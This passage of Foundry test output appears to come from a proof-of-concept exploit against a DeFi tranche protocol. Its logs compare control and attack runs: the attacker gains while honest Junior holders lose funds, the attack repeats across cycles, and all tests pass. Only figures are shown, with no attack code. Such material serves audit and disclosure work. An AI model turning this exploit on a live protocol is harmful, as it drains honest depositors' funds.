    honest Junior exit proceeds (atoms): 99496520394
  attacker PnL, control (atoms): -3055116
  attacker PnL, attack  (atoms): 341170841
  honest Junior loss caused by the attack (atoms): 499233666
  honest Junior loss in bps of its capital: 49
[PASS] test_RepeatableEveryFewEpochs() (gas: 41090580)
Logs:
  cycle: 1
    honest Junior value after reconcile (atoms): 99496520394
    attacker liquid USDG + Junior position (atoms): 505341170840
  cycle: 2
    honest Junior value after reconcile (atoms): 98991560880
    attacker liquid USDG + Junior position (atoms): 505680193334
  cycle: 3
    honest Junior value after reconcile (atoms): 98485718008
    attacker liquid USDG + Junior position (atoms): 506020107719
  elapsed for 3 cycles (seconds): 28801
  honest Junior value after 3 cycles, control (atoms): 99986064732
  honest Junior value after 3 cycles, attack  (atoms): 98485718008
  honest Junior loss caused by 3 cycles (atoms): 1500346724
  attacker wealth after 3 cycles, control (atoms): 504984757665
  attacker wealth after 3 cycles, attack  (atoms): 506020107719
  attacker gain caused by 3 cycles (atoms): 1035350054
[PASS] test_bound_ThirtyPercentHolderLosesMoney() (gas: 15320812)
Logs:
  control
    VPI paid at open (atoms): 0
    Junior principal used to price the redemption (atoms): 700999968944
    attacker redemption proceeds (atoms): 299999994525
    pool cash paid out at close (atoms): 0
    protocol treasury fees (atoms): 0
    attacker final USDG (atoms): 304999994525
    honest Junior exit proceeds (atoms): 699999968988
  cycle  
    VPI paid at open (atoms): 798403193
    Junior principal used to price the redemption (atoms): 701559090457
    attacker redemption proceeds (atoms): 300239276205
    pool cash paid out at close (atoms): 638400327
    protocol treasury fees (atoms): 160000000
    attacker final USDG (atoms): 304919273339
    honest Junior exit proceeds (atoms): 699920803267
  LP PnL, control (atoms): -5475
  LP PnL, cycle   (atoms): -80726661
Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 58.25ms (98.09ms CPU time)
Ran 1 test suite in 60.60ms (58.25ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

